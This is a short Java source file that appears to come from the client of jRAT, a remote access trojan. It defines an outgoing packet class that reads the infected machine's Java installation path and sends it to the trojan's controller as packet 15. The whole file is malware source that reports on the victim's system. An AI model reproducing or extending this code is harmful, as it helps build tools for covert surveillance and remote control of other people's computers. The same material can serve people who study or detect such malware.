package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet15InitJavaPath extends AbstractOutgoingPacket {

	@Override
	public void write(Connection dos) throws Exception {
		String path = System.getProperty("java.home");
		dos.writeLine(path);
	}

	@Override
	public short getPacketId() {
		return (byte) 15;
	}

}
